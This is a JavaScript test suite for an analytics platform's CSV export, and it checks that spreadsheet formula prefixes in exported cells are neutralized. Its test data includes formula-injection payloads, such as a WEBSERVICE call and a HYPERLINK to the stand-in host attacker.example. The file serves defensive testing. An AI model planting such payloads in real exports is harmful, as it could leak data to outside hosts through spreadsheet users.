require("should");
var exportsApi = require("../../api/parts/data/exports.js");

// Analytics data is written by whoever holds the app key, which ships inside published
// SDKs, so cell contents are attacker-influenced. If an exported cell reaches a
// spreadsheet client starting with a formula introducer, the client parses it as a
// formula rather than text.
//
// CSV quoting is not protection: the quotes are the text qualifier and the client strips
// them while parsing. The streamed export path quoted but never neutralized, and the
// non-streaming path neutralized only four of the six prefixes.
//
// Both directions matter. A dangerous cell must be defanged, and an ordinary cell must
// come through untouched, or every export quietly grows stray characters.
describe("csv formula neutralization on export", function() {
    // The marker the implementation prepends. Kept in one place because the assertions
    // below were written against a backtick while the code prepends an apostrophe, which
    // made the only case that checked the marker fail and left the "leaves ordinary
    // values alone" ones passing for any output at all.
    var MARKER = "'";
    /**
     * Run the streamed CSV writer over one document and return the raw output.
     * @param {object} doc - the document to stream
     * @param {object} projection - projection to pass, or undefined for none
     * @returns {Promise<string>} the written CSV
     */
    function streamCsv(doc, projection) {
        return new Promise(function(resolve) {
            var out = [];
            var res = {
                writeHead: function() {},
                write: function(s) {
                    out.push(s);
                },
                end: function() {}
            };
            var stream = {
                stream: function() {
                    return {
                        on: function(ev, cb) {
                            if (ev === "data") {
                                cb(doc);
                            }
                            return this;
                        }
                    };
                },
                once: function(ev, cb) {
                    if (ev === "close") {
                        setTimeout(cb, 0);
                    }
                }
            };
            var options = {filename: "t", type: "csv", writeHeaders: true, streamOptions: {}};
            if (projection) {
                options.projection = projection;
            }
            exportsApi.stream({res: res}, stream, options);
            setTimeout(function() {
                resolve(out.join(""));
            }, 150);
        });
    }

    /**
     * Split a CSV line into cells the way a spreadsheet client would, dropping the
     * text qualifier, so the assertions are about what the client actually sees.
     * @param {string} line - one CSV line
     * @returns {Array} cell values without their surrounding quotes
     */
    function cells(line) {
        return line.split('","').map(function(c) {
            return c.replace(/^"/, "").replace(/"$/, "");
        });
    }

    var DANGEROUS = ["=", "+", "-", "@", "\t", "\r"];

    /**
     * Assert no cell in the output would be read as a formula.
     * @param {string} csv - raw CSV output
     * @returns {void}
     */
    function noFormulaCells(csv) {
        csv.split("\r\n").filter(Boolean).forEach(function(line) {
            cells(line).forEach(function(v) {
                if (v.length) {
                    DANGEROUS.indexOf(v[0]).should.equal(-1, "cell parsed as formula: " + JSON.stringify(v));
                }
            });
        });
    }

    describe("streamed export, projection given (skips flattenObject)", function() {
        it("neutralizes every formula prefix in the values", async function() {
            var csv = await streamCsv({
                a: '=WEBSERVICE("https://attacker.example/x")',
                b: "+SUM(1,1)",
                c: "-1+1",
                d: "@SUM(1,1)",
                e: "\t=HYPERLINK(\"https://attacker.example\",\"c\")",
                f: "\r=1+1"
            }, {a: 1, b: 1, c: 1, d: 1, e: 1, f: 1});
            noFormulaCells(csv);
        });

        it("neutralizes the header cells too, since segment keys are attacker supplied", async function() {
            var csv = await streamCsv({ok: "x"}, {"=EVILHEADER()": 1, ok: 1});
            noFormulaCells(csv);
            csv.split("\r\n")[0].indexOf(MARKER + "=EVILHEADER()").should.be.above(-1);
        });

        it("leaves ordinary values alone", async function() {
            var csv = await streamCsv({a: "plain", b: "user@example.com", c: "a=b"}, {a: 1, b: 1, c: 1});
            csv.indexOf(MARKER).should.equal(-1);
        });
    });

    describe("streamed export, no projection (also passes through flattenObject)", function() {
        it("neutralizes, and does so exactly once", async function() {
            // both flattenObject and processCSVvalue neutralize on this path, so the
            // marker must not be applied twice
            var csv = await streamCsv({v: '=WEBSERVICE("http://x")', t: "\t=Y()"});
            noFormulaCells(csv);
            (csv.match(new RegExp(MARKER + "+", "g")) || []).forEach(function(run) {
                run.length.should.equal(1);
            });
        });

        it("does not add a second marker to a value that already begins with one", async function() {
            var csv = await streamCsv({v: MARKER + "=already"});
            (csv.match(new RegExp(MARKER + "+", "g")) || []).forEach(function(run) {
                run.length.should.equal(1);
            });
        });
    });

    describe("non-streaming convertData", function() {
        it("covers the leading tab and carriage return it used to miss", function() {
            var csv = exportsApi.convertData([{a: "\t=Y()", b: "\r=Z()"}], "csv");
            noFormulaCells(csv.split("\n").join("\r\n"));
        });

        it("still covers the four it always did", function() {
            var csv = exportsApi.convertData([{a: "=X()", b: "+X()", c: "-X()", d: "@X()"}], "csv");
            noFormulaCells(csv.split("\n").join("\r\n"));
        });

        it("leaves ordinary values alone", function() {
            var csv = exportsApi.convertData([{a: "plain", b: "user@example.com"}], "csv");
            csv.indexOf(MARKER).should.equal(-1);
        });
    });

    describe("formats that are not csv", function() {
        // flattenObject feeds xls, xlsx and json as well, and it used to neutralize for
        // all of them: an xlsx cell or a json string came out with a marker it has no use
        // for, because those writers emit typed cells rather than anything parsed as a
        // formula.
        it("leaves the value alone in json", function() {
            var json = exportsApi.convertData([{a: "=WEBSERVICE(\"http://x\")", b: "\t=Y()"}], "json");
            json.indexOf(MARKER).should.equal(-1);
            JSON.parse(json)[0].a.should.equal("=WEBSERVICE(\"http://x\")");
        });
    });

    describe("values that are not strings", function() {
        it("passes numbers through untouched, including negative ones", async function() {
            // a JS number cannot introduce a formula, and prefixing it would corrupt the
            // exported figure
            var csv = await streamCsv({n: -5, z: 0, b: true}, {n: 1, z: 1, b: 1});
            csv.indexOf(MARKER).should.equal(-1);
            csv.should.match(/-5/);
        });
    });
});
